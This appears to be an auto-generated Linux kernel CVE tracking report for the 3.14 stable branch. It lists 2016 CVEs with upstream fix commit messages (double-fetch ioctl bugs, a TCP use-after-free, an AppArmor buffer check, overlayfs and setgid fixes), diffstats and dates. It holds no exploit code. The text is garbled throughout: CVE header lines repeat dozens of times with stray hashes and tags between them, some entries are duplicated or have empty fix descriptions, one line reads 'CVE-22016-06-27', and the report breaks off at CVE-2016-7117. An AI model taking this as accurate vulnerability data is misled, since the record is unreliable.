CVE-2016-6130:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.79.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Author: Martin Schwidefsky <schwidefsky@de.ibm.com>
Date:   Mon Apr 25 17:54:28 2016 +0200

    s390/sclp_ctl: fix potential information leak with /dev/sclp
    
    The sclp_ctl_ioctl_sccb function uses two copy_from_user calls to
    retrieve the sclp request from user space. The first copy_from_user
    fetches the length of the request which is stored in the first two
    bytes of the request. The second copy_from_user gets the complete
    sclp request, but this copies the length field a second time.
    A malicious user may have changed the length in the meantime.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Reviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>
    Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

 drivers/s390/char/sclp_ctl.c |   12 +++++++-----
 1 file changed, 7 insertions(+), 5 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-6130
Break Date: 2013-06-26
Break Commit: d475f942b1dd6a897dac3ad4ed98d6994b275378
Break Tag: 3.11
Linus Fix Date: 2016-04-27
Linus Commit: 532c34b5fbf1687df63b3fcd5b2846312ac943c6
Linus Tag: 4.6
Stable Date: 2016-09-11
Stable Commit: 78a4260f1fad5cfc6ad7cf6e01a93a2fed0d0e3e
Stable Tag: 3.14.79

CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
CVE-2016-6136:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 43761473c254b45883a64441dd0bc85a42f3645c
Author: Paul Moore <paul@paul-moore.com>
Date:   Tue Jul 19 17:42:57 2016 -0400

    audit: fix a double fetch in audit_log_single_execve_arg()
    
    There is a double fetch problem in audit_log_single_execve_arg()
    where we first check the execve(2) argumnets for any "bad" characters
    which would require hex encoding and then re-fetch the arguments for
    logging in the audit record[1].  Of course this leaves a window of
    opportunity for an unsavory application to munge with the data.
    
    This patch reworks things by only fetching the argument data once[2]
    into a buffer where it is scanned and logged into the audit
    records(s).  In addition to fixing the double fetch, this patch
    improves on the original code in a few other ways: better handling
    of large arguments which require encoding, stricter record length
    checking, and some performance improvements (completely unverified,
    but we got rid of some strlen() calls, that's got to be a good
    thing).
    
    As part of the development of this patch, I've also created a basic
    regression test for the audit-testsuite, the test can be tracked on
    GitHub at the following link:
    
     * https://github.com/linux-audit/audit-testsuite/issues/25
    
    [1] If you pay careful attention, there is actually a triple fetch
    problem due to a strnlen_user() call at the top of the function.
    
    [2] This is a tiny white lie, we do make a call to strnlen_user()
    prior to fetching the argument data.  I don't like it, but due to the
    way the audit record is structured we really have no choice unless we
    copy the entire argument at once (which would require a rather
    wasteful allocation).  The good news is that with this patch the
    kernel no longer relies on this strnlen_user() value for anything
    beyond recording it in the log, we also update it with a trustworthy
    value whenever possible.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Cc: <stable@vger.kernel.org>
    Signed-off-by: Paul Moore <paul@paul-moore.com>

 kernel/auditsc.c |  332 +++++++++++++++++++++++++++---------------------------
 1 file changed, 164 insertions(+), 168 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6136
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-07-20
Linus Commit: 43761473c254b45883a64441dd0bc85a42f3645c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
CVE-2016-6156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 096cdc6f52225835ff503f987a0d68ef770bb78e
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Tue Jun 21 16:58:46 2016 +0300

    platform/chrome: cros_ec_dev - double fetch bug in ioctl
    
    We verify "u_cmd.outsize" and "u_cmd.insize" but we need to make sure
    that those values have not changed between the two copy_from_user()
    calls.  Otherwise it could lead to a buffer overflow.
    
    Additionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.
    We should use the new smaller value so we don't copy too much data to
    the user.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Tested-by: Gwendal Grignou <gwendal@chromium.org>
    Cc: <stable@vger.kernel.org> # v4.2+
    Signed-off-by: Olof Johansson <olof@lixom.net>

 drivers/platform/chrome/cros_ec_dev.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6156
Break Date: 2015-06-15
Break Commit: a841178445bb72a3d566b4e6ab9d19e9b002eb47
Break Tag: 4.2
Linus Fix Date: 2016-07-05
Linus Commit: 096cdc6f52225835ff503f987a0d68ef770bb78e
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
4.5:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
4.5:
4.5:
CVE-2016-6187:
CVE-2016-6187:
2016-07-08:
CVE-2016-6187:
CVE-2016-6187:
CVE-2016-6187:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Author: Vegard Nossum <vegard.nossum@oracle.com>
Date:   Thu Jul 7 13:41:11 2016 -0700

    apparmor: fix oops, validate buffer size in apparmor_setprocattr()
    
    When proc_pid_attr_write() was changed to use memdup_user apparmor's
    (interface violating) assumption that the setprocattr buffer was always
    a single page was violated.
    
    The size test is not strictly speaking needed as proc_pid_attr_write()
    will reject anything larger, but for the sake of robustness we can keep
    it in.
    
    SMACK and SELinux look safe to me, but somebody else should probably
    have a look just in case.
    
    Based on original patch from Vegard Nossum <vegard.nossum@oracle.com>
    modified for the case that apparmor provides null termination.
    
    Fixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a
    Reported-by: Vegard Nossum <vegard.nossum@oracle.com>
    Cc: Al Viro <viro@zeniv.linux.org.uk>
    Cc: John Johansen <john.johansen@canonical.com>
    Cc: Paul Moore <paul@paul-moore.com>
    Cc: Stephen Smalley <sds@tycho.nsa.gov>
    Cc: Eric Paris <eparis@parisplace.org>
    Cc: Casey Schaufler <casey@schaufler-ca.com>
    Cc: stable@kernel.org
    Signed-off-by: John Johansen <john.johansen@canonical.com>
    Reviewed-by: Tyler Hicks <tyhicks@canonical.com>
    Signed-off-by: James Morris <james.l.morris@oracle.com>

 security/apparmor/lsm.c |   36 +++++++++++++++++++-----------------
 1 file changed, 19 insertions(+), 17 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6187
Break Date: 2016-01-04
Break Commit: bb646cdb12e75d82258c2f2e7746d5952d3e321a
Break Tag: 4.5
Linus Fix Date: 2016-07-08
Linus Commit: 30a46a4647fd1df9cf52e43bf467f0d9265096ca
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6327:
CVE-2016-6327:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
CVE-2016-6327:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 51093254bf879bc9ce96590400a87897c7498463
Author: Bart Van Assche <bart.vanassche@sandisk.com>
Date:   Thu Feb 11 11:03:09 2016 -0800

    IB/srpt: Simplify srpt_handle_tsk_mgmt()
    
    Let the target core check task existence instead of the SRP target
    driver. Additionally, let the target core check the validity of the
    task management request instead of the ib_srpt driver.
    
    This patch fixes the following kernel crash:
    
    BUG: unable to handle kernel NULL pointer dereference at 0000000000000001
    IP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7/0x790 [ib_srpt]
    Oops: 0002 [#1] SMP
    Call Trace:
     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
